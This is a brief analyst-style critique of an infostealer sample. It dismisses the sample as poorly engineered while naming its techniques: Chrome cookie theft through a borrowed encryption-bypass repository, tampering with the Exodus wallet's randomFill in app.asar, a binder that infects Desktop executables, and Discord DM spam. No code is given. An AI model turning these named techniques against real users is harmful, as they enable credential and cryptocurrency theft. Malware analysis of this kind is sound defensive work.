Don't confuse "dangerous to victims" with "skilled engineering": stealing Chrome cookies via a pasted ABE repo, patching Exodus's `randomFill` in `app.asar`, infecting Desktop EXEs with a `BND!` binder, and spamming Discord DMs will still ruin a careless user's day. But as malware engineering? It's lazy, leaky, GitHub-assembled garbage that completely falls apart the moment you drop it into IDA.
